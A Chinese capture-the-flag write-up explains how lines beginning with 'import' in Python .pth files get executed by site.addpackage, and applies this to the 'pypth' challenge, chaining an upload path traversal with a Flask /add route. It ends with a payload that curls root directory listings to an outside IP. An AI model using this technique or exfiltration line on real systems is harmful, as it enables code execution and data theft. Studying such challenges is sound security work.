原理：Python pth文件写入getshell

参考https://www.cnblogs.com/Nestar/p/17336664.html

python的site模块支持"Site-specific configuration hook"的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入

sys.prefix和sys.exec_prefix在D:/Python，那么创建路径为D:\Python\Lib\site-packages\1.pth的pth文件，然后其内容为

D:/Python/temp/

重新启动python

1.path的路径被添加到sys.path中

site.py的实现中，有这么一段

def addpackage(sitedir, name, known_paths):
    if known_paths is None:
        known_paths = _init_pathinfo()
        reset = True
    else:
        reset = False
    fullname = os.path.join(sitedir, name)
    _trace(f"Processing .pth file: {fullname!r}")
    try:
        # locale encoding is not ideal especially on Windows. But we have used
        # it for a long time. setuptools uses the locale encoding too.
        f = io.TextIOWrapper(io.open_code(fullname), encoding="locale")
    except OSError:
        return
    with f:
        for n, line in enumerate(f):
            if line.startswith("#"):
                continue
            if line.strip() == "":
                continue
            try:
                if line.startswith(("import ", "import\t")):
                    exec(line)
                    continue
                line = line.rstrip()
                dir, dircase = makepath(sitedir, line)
                if not dircase in known_paths and os.path.exists(dir):
                    sys.path.append(dir)
                    known_paths.add(dircase)
            except Exception:
                print("Error processing line {:d} of {}:\n".format(n+1, fullname),
                      file=sys.stderr)
                import traceback
                for record in traceback.format_exception(*sys.exc_info()):
                    for line in record.splitlines():
                        print('  '+line, file=sys.stderr)
                print("\nRemainder of file ignored", file=sys.stderr)
                break
    if reset:
        known_paths = None
    return known_paths

if line.startswith(("import ", "import\t")):
                    exec(line)

当pth文件内容以import或者import\t开头时，会执行这一行代码

所以可以在pth文件里构造一下命令执行

import os;os.system("calc")

现在一运行python就直接执行了命令

所以可以利用 site.addpackage() 来进行RCE

import site

site_dir = "D:\Python\Lib\site-packages"
name = "1.pth"

site.addpackage(site_dir, name, None)

例题：闽盾杯2023 pypth

环境没了自己搭了一下

app.py

from flask import Flask, request, Response
import os
import shutil
import site



app = Flask(__name__)


@app.route('/')
def index():
    return app.send_static_file('index.html')


@app.route('/upload', methods=['POST'])
def upload():
    f = request.files["data"]
    with open(f'/tmp/storage/{f.filename}', 'wb+') as destination:
        destination.write(f.read())
    return Response("File is uploaded!", 200)


@app.route('/install', methods=['GET'])
def install():
    package_name = request.args.get('package_name')
    if '..' in package_name:
        return Response("Not allowed!", 400)

    src = os.path.join('contrib', 'packages', package_name)
    dst = os.path.join('/tmp/extract', package_name)

    shutil.copy(src, dst)
    shutil.unpack_archive(dst, extract_dir='/tmp/extract')

    return Response("Installed!", 200)


@app.route('/clean', methods=['GET'])
def clean():
    file = os.path.basename(request.args.get('file'))
    file_safe = f'/tmp/storage/{file}'
    os.unlink(file_safe)
    return Response("file removed!", 200)


@app.route('/add', methods=['GET'])
def add():
    site_dir = "/tmp/extract"
    name = request.args.get('name')
    site.addpackage(site_dir, name, None)



if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0')

复现完发现/install路由确实没用，但是做题就光看这个路由了。。

os path的特性，如果后面的参数有/ ,则忽略前面的路径

利用upload 可以穿越到/tmp/extract目录 ,因为没做任何过滤

先编写好pth文件,直接外带

import os;os.popen('curl http://47.100.196.3:4444/?a=`ls /|base64`').read()

上传后 /add路由读取1.pth即可
